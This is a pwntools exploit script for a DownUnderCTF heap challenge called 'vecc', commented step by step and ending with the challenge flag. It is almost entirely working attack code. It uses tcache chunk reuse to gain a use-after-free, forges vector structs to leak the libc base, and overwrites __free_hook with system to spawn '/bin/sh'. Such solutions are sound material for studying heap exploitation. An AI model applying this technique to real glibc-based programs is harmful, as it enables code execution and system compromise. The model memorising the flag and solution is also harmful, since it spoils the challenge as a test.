from pwn import *
from sys import argv

libc_elf = ELF('./libc.so.6')

if 'debug' in argv:
    p = gdb.debug('./patched', gdbscript='c', env={'LD_PRELOAD': './libc.so.6'})
elif 'remote' in argv:
    p = remote('chal.duc.tf', 30007)
elif 'docker' in argv:
    p = remote('127.0.0.1', 1337)
else:
    p = process('./patched', env={'LD_PRELOAD': './libc.so.6'})

def create_vecc(index):
    log.info(f'Creating vector at index {index}')
    p.sendlineafter('1: create vecc', '1')
    p.sendlineafter('Index?', str(index))
    p.recvuntil('Done!')
    return index

def show_vecc(index):
    log.info(f'Showing vector at index {index}')
    p.sendlineafter('1: create vecc', '5')
    p.sendlineafter('Index?', str(index))
    p.recvline()
    p.recvuntil('> ')


def destroy_vecc(index):
    log.info(f'Destroying vector at index {index}')
    p.sendlineafter('1: create vecc', '2')
    p.sendlineafter('Index?', str(index))

def append(index, length, content):
    log.info(f'Appending the following {hex(length)} bytes to vector at index {index}:\n{hexdump(content)}')
    assert len(content) <= length, f'{len(content)} {length}'
    p.sendlineafter('1: create vecc', '3')
    p.sendlineafter('Index?', str(index))
    p.sendlineafter('Length?', str(length))
    p.sendline(content)

# Create vector0
create_vecc(0)

# Create buffer0.
# Size 0x10, same as the vector struct.
append(0, 0x10, b'a'*8 + p32(0) + p32(0x102020))

# Free buffer0 and then vector0.
# They will be placed in the same tcache bin.
destroy_vecc(0)

# Create vector1, which will be placed on vector0's chunk.
# This is not useful.
create_vecc(1)

# Create vector2, which will be placed on buffer0's chunk.
# This is useful.
# vector2 will have the same data we used to initialize buffer0.
# This means it will have 0x102020 capacity.
# Also, the buffer member points to the next free 0x20 bin chunk, 
# thanks to tcache_get which does not zero out the next ptr (bruh).
# This next free chunk was created by append, as it makes a temporary
# buffer to store the input and then frees it after it was copied to the vector buffer.
create_vecc(2)

# So we basically gave ourselves some kind of artificial UAF!
# We can control where the next chunks will be allocated by overwriting the metadata
# of this next free chunk.
# However, what I'm really trying to do is defining the next vec struct.
# We will not actually 'derail' the tcache bin,
# I just need to control the content of the next vector struct we allocate.
# buffer = 0x602030
# size = 8
# capacity = [big number]
# Remember once again that append_vecc uses malloc to store the input.
# Do not use the 0x20 bin for this new input! 
# That would defeat the point, we need the next 0x20 bin chunk to go to a vect struct. 
# Here I am using the 0x30 bin
append(2, 0x20, p64(0x602030) + p32(8) + b'a'*0x14)

# vec3 struct is initialized just like we wanted it.
# 0x602030 is on the .bss segment, just before the list of vec structs at 0x602040.
# 0x602030 contains a pointer to the libc's stdin struct, which means we can leak libc.
create_vecc(3)

# Obtain the address of the stdin struct and use it to calculate the libc base address.
show_vecc(3)
leak = u64(p.recv(8))
libc_elf.address = leak - libc_elf.sym['_IO_2_1_stdin_']
log.info(f'Libc: {hex(libc_elf.address)}')

# extend vec3 and make a fake vector struct on 0x602038, pointing to __free_hook - 8.
# Add the fake vec to the list of vectors, index 1
append(3, 0x20, p64(libc_elf.sym['__free_hook'] - 8) + p32(0) + p32(0x10000) + p64(0x602038) + b'a'*0x8)

# Overwrite free_hook. 
# This input string will be placed in a temporary buffer, so we send /bin/sh\x00 first,
# And when free is called on the temporary buffer it will be taken as parameter to system.
append(1, 0x20, b'/bin/sh\x00' + p64(libc_elf.sym['system']) + b'a'*0x10)

p.interactive() # DUCTF{h@v_2_z3r0_ur_all0ca710n5}
